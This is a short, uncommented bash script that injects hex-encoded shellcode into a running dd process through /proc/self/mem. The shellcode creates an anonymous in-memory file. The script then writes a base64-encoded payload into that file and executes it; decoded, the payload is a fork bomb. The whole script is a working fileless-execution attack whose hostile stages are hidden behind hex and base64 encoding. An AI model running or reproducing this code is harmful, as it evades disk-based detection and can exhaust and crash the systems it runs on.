#!/bin/bash
pid_address_1=$(setarch x86_64 -R dd if=/proc/self/maps | grep "bin/dd" | head -c 12)
pid_address_2=$(objdump -Mintel -d `which dd` | grep fclose | tr -d ' ' | grep jmp | cut -c 1-4)
echo -n -e "\x48\x31\xc0\x48\x31\xff\x66\xbf\x0a\x00\xb8\x20\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\xff\xc7\xb8\x20\x00\x00\x00\x0f\x05\x68\x73\x6f\x43\x78\x48\x89\xe7\xbe\x00\x00\x00\x00\xb8\x3f\x01\x00\x00\x0f\x05\xb8\x22\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05" | setarch x86_64 -R dd of=/proc/self/mem bs=1 seek=$(( 0x$pid_address_1 + 0x$pid_address_2 )) conv=notrunc 10<&0 11<&1 & sudo ls -al /proc/$(pidof dd)/fd/
echo "IyEvYmluL2Jhc2gKOigpeyA6fDomIH07Ogo=" | base64 -d > /proc/`pidof dd`/fd/3
/proc/`pidof dd`/fd/3 -a
